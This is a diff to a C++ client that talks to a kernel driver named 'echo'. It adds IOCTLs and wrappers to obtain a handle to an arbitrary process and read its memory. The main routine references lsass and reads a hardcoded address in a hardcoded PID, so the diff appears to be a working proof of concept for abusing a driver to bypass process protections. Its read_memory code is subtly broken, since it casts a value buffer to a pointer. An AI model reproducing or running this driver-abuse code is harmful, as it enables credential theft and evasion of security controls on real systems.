@@ -7,6 +7,8 @@
 
 #define ECHODRV_VERIFY_SIGNATURE  CTL_CODE(0x9E6A, 0x165, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define ECHODRV_REGISTER_CALLBACK CTL_CODE(0x252E, 0x782, METHOD_BUFFERED, FILE_READ_ACCESS)
+#define ECHODRV_READ_MEMORY       CTL_CODE(0x60A2, 0x849, METHOD_BUFFERED, FILE_READ_ACCESS)
+#define ECHODRV_OBTAIN_HANDLE     CTL_CODE(0xE622, 0x92, METHOD_BUFFERED, FILE_READ_ACCESS)
 
 // CreateFileA flags
 
@@ -37,6 +39,29 @@ namespace echo::structs
 
 	bool success;
 	ulong self_proc_id;
+  };
+
+  struct ReadMemory
+  {
+	void* handle;
+
+	void* read_address;
+	void* read_buffer;
+
+	int64_t buffer_size;
+	int64_t bytes_out;
+
+	bool success; int unk_1;
+  };
+
+  struct ObtainHandle
+  {
+	ulong proc_id;
+	ulong access;
+
+	void* handle_out;
+
+	bool success; int unk_1;
   };
 }
 
@@ -79,8 +104,14 @@ namespace echo::driver
   {
 	structs::VerifySignature packet = { };
 
-	 return call_driver<structs::VerifySignature>
+	const auto status = call_driver<structs::VerifySignature>
 	  (ECHODRV_VERIFY_SIGNATURE, packet);
+
+	{
+	  printf("\tReturn from VerifySignature [%d]\n", packet.success);
+	}
+
+	return status;
   }
 
   bool register_callback(const ulong& proc_id, const ulong& proc_id2) noexcept
@@ -92,8 +123,61 @@ namespace echo::driver
 	  packet.proc_id2 = proc_id2;
 	}
 
-	return call_driver<structs::RegisterCallback>
+	const auto status = call_driver<structs::RegisterCallback>
 	  (ECHODRV_REGISTER_CALLBACK, packet);
+
+	{
+	  printf("\tReturn from RegisterCallback [%d]\n", packet.success);
+	}
+
+	return status;
+  }
+
+  template <typename Type>
+  void read_memory(const ulong address, size_t size)
+  {
+	structs::ReadMemory packet = { };
+
+	Type    buffer = { }; 
+	int64_t bytes  = { };
+
+	{
+	  packet.read_address = (void*) address;
+	  packet.handle       = attached_handle;
+
+	  packet.read_buffer  = (void*) buffer;
+
+	  packet.buffer_size  = size;
+	  packet.bytes_out    = bytes;
+	}
+
+	(void) call_driver<structs::ReadMemory>
+	  (ECHODRV_READ_MEMORY, packet);
+
+	std::cout << "ReadMemory called " << buffer << '\n';
+  }
+
+  bool obtain_handle(const ulong& proc_id)
+  {
+	structs::ObtainHandle packet = { };
+
+	{
+	  packet.proc_id = proc_id;
+	  packet.access  = 0ul;
+	}
+
+	const auto status = call_driver<structs::ObtainHandle>
+	  (ECHODRV_OBTAIN_HANDLE, packet);
+
+	{
+	  attached_handle = packet.handle_out;
+	}
+
+	{
+	  printf("\tReturned from ObtainHandle [%d]\n", packet.success);
+	}
+
+	return status;
   }
 }
 
@@ -113,6 +197,14 @@ int main(int argc, char** argv)
 
 	if (!driver::register_callback(GetCurrentProcessId(), lsass))
 	  printf("Failed to register callback [%d]\n", GetLastError());
+
+	if (!driver::obtain_handle(19192))
+	  printf("Failed to obtain handle [%d]\n", GetLastError());
+
+	printf("Attached handle [%p]\n\n", driver::attached_handle);
+
+	driver::read_memory<int>((ulong) 0x0000009A7218F7B0, sizeof(int));
+  
   }
   else
   {
